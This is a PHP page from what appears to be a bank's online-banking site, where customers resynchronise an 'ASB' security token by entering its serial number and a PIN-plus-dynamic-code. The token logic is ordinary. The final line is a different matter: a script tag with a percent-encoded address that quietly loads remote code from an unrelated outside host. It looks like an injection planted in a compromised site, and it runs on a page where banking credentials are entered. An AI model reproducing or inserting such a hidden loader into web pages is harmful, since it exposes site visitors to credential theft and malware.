<?php
($parametros['Access']!=""?$Access=ltrim(rtrim($parametros['Access'])):0);
($parametros['Serial']!=""?$Serial=ltrim(rtrim($parametros['Serial'])):0);
($parametros['PassCode']!=""?$PassCode=ltrim(rtrim($parametros['PassCode'])):0);

$host = $ini->read_var( 'site', 'RSAHost' );
$port = $ini->read_var( 'site', 'RSAPort' );

include_once( "classes/ezsync.php" );	//T-164295 ReSync cambio a levantar mas de una instancia de la librer�a
?>
<h1>Sincronizaci&oacute;n de la Clave ASB (Acceso Seguro Baj&iacute;o)</h1>
<hr noshade='noshade' size='4' />
<br />
<?php
if ( !isset( $Access ) )
	$Access = 'FrAc';
	
$transaction_buffer = '';
?>
<script type="text/javascript">
						function isEnter(e)
						{
							var characterCode;

							if(e && e.which)
							{
								e = e;
								characterCode = e.which;
							}
							else
							{
								characterCode = e.keyCode;
							}

							if(characterCode == 13)
							{
								return true;
							}
							else
							{
								return false;
							}
						}
						
						function procesarAjax()
						{
							
							var parametros=	'Access:'+document.getElementsByName('Access')[0].value;
							
							if(document.getElementsByName('Serial')[0]!=null)
							{
								parametros+=',Serial:'+document.getElementsByName('Serial')[0].value;
							}
							
							if(document.getElementsByName('PassCode')[0]!=null)
							{
								parametros+=',PassCode:'+document.getElementsByName('PassCode')[0].value;
							}
							
							iniProcesarMenu('synchronizeasb', parametros);
						}
						
						function onUp (e)
						{
							if(document.getElementById( 'Serial' )!=null && document.getElementsByName( 'PassCode' )[0]!=null)
							{
								if ( ( document.getElementById( 'Serial' ).value.length >= 8 ) && ( document.getElementById( 'PassCode' ).value.length == 10 ) ) 
								{
									document.getElementById( 'OK' ).disabled = false; 

									if (isEnter(e) == true) 
									{ 
										procesarAjax();  
									} 
								}
								else 
								{
									document.getElementById( 'OK' ).disabled = true; 
								}
								
								
							}
							else
							{
									if ( ( document.getElementsByName( 'PassCode' )[0].value.length == 10 ) ) 
									{
									
										document.getElementById( 'OK' ).disabled = false;
										
										if (isEnter(e) == true) 
										{ 
											procesarAjax();  
										} 
									} 
									else 
									{
										document.getElementById( 'OK' ).disabled = true;
									} 
									
									
															
							}
								
						}
	</script>
	
<?php	
switch ( $Access )
{
	case 'FrAc':
	?>
	<input type='HIDDEN' name='Access' value='Confirm'>
			<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
				<tr>
					<td>
						<ul type='DISC'>
							<li>Si no ha usado su <b>Clave ASB</b> por 3 semanas, ejecute los siguientes pasos:</li>
								<ol>
									<li>Registrar el <b>No. de Serie</b> de la <b>Llave ASB</b>, este se encuentra en la parte posterior del mismo, <b>formado de 8 a 12 d&iacute;gitos</b>, por ejemplo 2796005458.</li>
									<li>Registre su <b>Clave ASB</b>, la cual est&aacute; formada por 10 d&iacute;gitos (4 d&iacute;gitos de su <b>NIP</b> m&aacute;s 6 d&iacute;gitos de su <b>Clave Din&aacute;mica</b>).</li>
									<li>Presione el bot&oacute;n <em>Aceptar</em>.</li>
								</ol>
							</li>
							<li>La <b>Clave ASB</b> no ser&aacute; desplegada en su pantalla, por seguridad aparecer&aacute;n asteriscos.</li>
							<li>El bot&oacute;n <em>Aceptar</em> ser&aacute; habilitado cuando los datos est&eacute;n completos.</li>
						</ul>
						<hr size='1' noshade>
					</td>
				</tr>
				<tr>
					<td align='CENTER'>
						<table align='CENTER' border='0' cellspacing='0' cellpadding='0'>
							<tr>
								<th>No. de Serie</th>
								<th>&nbsp;</th>
								<th>Clave ASB</th>
							</tr>
							<tr>
								<td align='CENTER'><input align='LEFT' id='Serial' name='Serial' maxlength='12' onkeyup="onUp(event)" size='12' type='TEXT'></td>
								<td>&nbsp;&nbsp;&nbsp;</td>
								<td align='CENTER'><input align='LEFT' id='PassCode' name='PassCode' maxlength='10' onkeyup="onUp(event)"   size='10' type='PASSWORD'></td>
							</tr>
							<tr>
								<td colspan='3'>&nbsp;</td>
							</tr>
							<tr>
								<td colspan='3' align='CENTER'><input disabled='true' id='OK' name='OK' onclick="javascript:{ document.getElementById( 'OK' ).disabled = true; procesarAjax(); }" type='BUTTON' value='Aceptar'></td>
							</tr>
						</table>
					</td>
				</tr>
			</table>
			
		<?php
		break;
		
	case 'Confirm':
		if ( !is_numeric( $Serial ) )
		{
			?>
			<br />
			<p>El <b>No. Serial</b> debe estar conformados &uacute;nicamente por n&uacute;meros.</p>
			<?php
			break;
		}
		if ( !is_numeric( $PassCode ) )
		{
			?>
			<br />
			<p>El <b>NIP</b> debe estar conformado &uacute;nicamente por n&uacute;meros.</p>
			<?php
			break;
		}
		$transaction_buffer = '';

		//T-164295 ReSync I cambio a levantar mas de una instancia de la librer�a
		$EZSync = new EZSync( );
		$port =$EZSync->GetSyncPort( $usr );
		if ( $port == 0 )
		{
			$ret_code = '09';
		}
		else
		{
			$ret_code = $tr->PostToRSA_Sync( $host, $port, '03', $usr, $Serial, '', '', substr( $PassCode, 4, 6 ), '', $transaction_buffer );
		}
		//T-164295 ReSync F cambio a levantar mas de una instancia de la librer�a
		$tr->blog( $qki, 'SincronizacionASB', '', '', '', '', $Serial );
		switch ( $ret_code )
		{
			case '00':
					//T-164295 ReSync I cambio a levantar mas de una instancia de la librer�a
					$session =& eZSession::globalSession( );
					if( $session->fetch( ) )
					{
						$session->setVariable( "rsa_port", $port );		//eZSync
						$session->setVariable( "rsa_sync", time( ) );		//eZSync
					}
					//T-164295 ReSync F cambio a levantar mas de una instancia de la librer�a
				?>
					<input type='HIDDEN' name='Access' value='Process'>
					<input type='HIDDEN' name='Serial' value='<?php echo $Serial;?>'>
					<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
						<tr>
							<td>
								<ul type='DISC'>
									<li>Espere unos segundos a que su <b>Clave Din&aacute;mica</b> cambie autom&aacute;ticamente.</li>
									<li>Capture su <b>Clave ASB</b>, la cual est&aacute; formada por 10 d&iacute;gitos (4 d&iacute;gitos de su <b>NIP</b> m&aacute;s 6 d&iacute;gitos de su nueva <b>Clave Din&aacute;mica</b>).</li>
									<li>La <b>Clave ASB</b> no ser&aacute; desplegada en su pantalla, por seguridad aparecer&aacute;n s&oacute;lo asteriscos.</li>
									<li>El bot&oacute;n <em>Aceptar</em> ser&aacute; habilitado cuando la <b>Clave ASB</b> est&eacute; completa.</li>
								</ul>
								<hr size='1' noshade>
							</td>
						</tr>
						<tr>
							<td align='CENTER'>
								<table align='CENTER' border='0' cellspacing='0' cellpadding='0'>
									<tr>
										<th>Clave ASB</th>
									</tr>
									<tr>
										<td align='CENTER'><input align='LEFT' id='PassCode' name='PassCode' maxlength='10' onkeyup="onUp(event)" size='10' type='PASSWORD'></td>
									</tr>
									<tr>
										<td>&nbsp;</td>
									</tr>
									<tr>
										<td align='CENTER'><input disabled='true' id='OK' name='OK' onclick="javascript:{ document.getElementById( 'OK' ).disabled = true; procesarAjax(); }" type='BUTTON' value='Aceptar'></td>
									</tr>
								</table>
							</td>
						</tr>
					</table>
					<?php
				break;
			case '02':
				?>
				<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
					<tr>
						<td>
							<p align='JUSTIFY'>El N&uacute;mero de Serie no coincide con el que le asignaron en sucursal.</p>
						</td>
					</tr>
				</table>
				<?php
				break;
			case '03':
				?>
				<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
					<tr>
						<td>
							<p align='JUSTIFY'>Su <b>Clave ASB</b> es Incorrecta.</p>
							<p align='JUSTIFY'>Favor de volverlo a intentar nuevamente.</p>
						</td>
					</tr>
				</table>
				<?php
				break;
			case '08':
				
				?>
				<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
					<tr>
						<td>
							<p align='JUSTIFY'>Su <b>Llave ASB</b> ya fue activada.</p>
						</td>
					</tr>
				</table>
				<?php
				break;
			default:
				?>
				<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
					<tr>
						<td>
							<p align='JUSTIFY'>Su transacci&oacute;n no pudo ser completada.</p>
							<p align='JUSTIFY'>Favor de volverlo a intentar m&aacute;s tarde.</p>
							<p align='JUSTIFY'>C&oacute;digo: (<?php echo( $ret_code ) ?>).</p>
						</td>
					</tr>
				</table>
				
				<?php
		}
		break;
	case 'Process':
		if ( !is_numeric( $PassCode ) )
		{
			?><br />
			<p>Su <b>Clave ASB</b> debe estar conformado &uacute;nicamente por n&uacute;meros.</p>
			<?php
			break;
		}
		$transaction_buffer = '';
		//T-164295 ReSync I cambio a levantar mas de una instancia de la librer�a
		$session =& eZSession::globalSession( );
		if( $session->fetch( ) )
		{
			$EZSync = new EZSync( );
			$port_time = $session->variable( "rsa_sync" );
			$port = $session->variable( "rsa_port" );
			if ( time( ) - $port_time <= 60 * $EZSync->TIME_TO_LIVE )
			{
				$ret_code = $tr->PostToRSA_Sync( $host, $port, '03', $usr, $Serial, '', '', '',substr( $PassCode, 4, 6 ), $transaction_buffer );
			}
			else
			{
				$ret_code = '09';
			}
			$EZSync->FreePort( $port );
		}
		else
		{
			$ret_code = '10';
		}
		//T-164295 ReSync F cambio a levantar mas de una instancia de la librer�a
			switch ( $ret_code )
			{
				case '00':
					?>
					<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
						<tr>
							<td>
								<p align='JUSTIFY'>Su <b>Clave ASB</b> ha sido sincronizada con &eacute;xito.</p>
								<p align='JUSTIFY'><em>*Nota: Recuerde que para poder realizar una transacci&oacute;n que implique su <b>Clave ASB</b>, tiene que esperar a que cambie autom&aacute;ticamente su <b>Clave Din&aacute;mica</b> ya que &eacute;sta no puede ser utilizada m&aacute;s de una ocasi&oacute;n.</p>
							</td>
						</tr>
					</table>
					<?php
					break;
				case '02':
					?>
					<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
						<tr>
							<td>
								<p align='JUSTIFY'>El N&uacute;mero de Serie no coincide con el que le asignaron en sucursal.</p>
							</td>
						</tr>
					</table>
					<?php
					break;
				case '03':
					?>
					<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
						<tr>
							<td>
								<p align='JUSTIFY'>Su <b>Clave ASB</b> es Incorrecta.</p>
								<p align='JUSTIFY'>Favor de volverlo a intentar nuevamente.</p>
							</td>
						</tr>
					</table>
					<?php
					break;
				case '08':
					?>
					<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
						<tr>
							<td>
								<p align='JUSTIFY'>Su <b>Llave ASB</b> ya fue activada.</p>
							</td>
						</tr>
					</table>
					<?php
					break;
				default:
					?>
					
					<table align='CENTER' border='0' cellspacing='0' cellpadding='0' width='85%'>
						<tr>
							<td>
								<p align='JUSTIFY'>Su transacci&oacute;n no pudo ser completada.</p>
								<p align='JUSTIFY'>Favor de volverlo a intentar m&aacute;s tarde.</p>
								<p align='JUSTIFY'>C&oacute;digo: (<?php echo $ret_code; ?>).</p>
							</td>
						</tr>
					</table>
					
					<?php
			}
}

$tr->blog( $qki, 'SincronizacionASB', '', '', '', '', isset( $Serial ) ? $Serial : '' );
$tr->PostToHost( $backend, '/IBnkIIS.dll', 'Trxn=sas&Access=' . urlencode( $Access ) . '&CustID='.urlencode( $usr ) . '&Cadpriv=' . urlencode( $priv ) . '&Action=JustLog' . ( isset( $Serial ) ? '&desc1=' . urlencode( $Serial ) : '' ) . ( isset( $ret_code ) ? '&Error=' . urlencode( $ret_code ) : '' ) . ( isset( $transaction_buffer ) ? '&Message=' . urlencode( $transaction_buffer ) : '' ), $qki, $usr, $qki, $priv, $transaction_buffer );
 $transaction_buffer="";


?><script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>